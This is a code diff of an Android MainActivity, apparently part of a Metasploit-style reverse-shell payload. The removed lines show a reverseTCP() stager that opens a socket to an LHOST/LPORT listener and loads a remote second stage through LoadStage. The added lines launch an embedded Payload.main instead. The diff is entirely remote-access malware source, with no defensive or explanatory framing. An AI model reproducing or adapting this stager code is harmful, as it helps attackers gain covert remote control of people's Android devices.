@@ -45,13 +45,9 @@ public class MainActivity extends Activity
 
     private void reverseTCP() {
         try {
-            String lhost = LHOST.substring(4).trim();
-            String lport = LPORT.substring(4).trim();
-            Socket msgsock = new Socket(lhost, Integer.parseInt(lport));
-            DataInputStream in = new DataInputStream(msgsock.getInputStream());
-            OutputStream out = new DataOutputStream(msgsock.getOutputStream());
-            new LoadStage().start(in, out, this, new String[] {});
-            msgsock.close();
+            System.setProperty("user.dir", getFilesDir().getAbsolutePath());
+            Payload.context = this;
+            Payload.main(null);
         } catch (Exception e) {
             e.printStackTrace();
         }
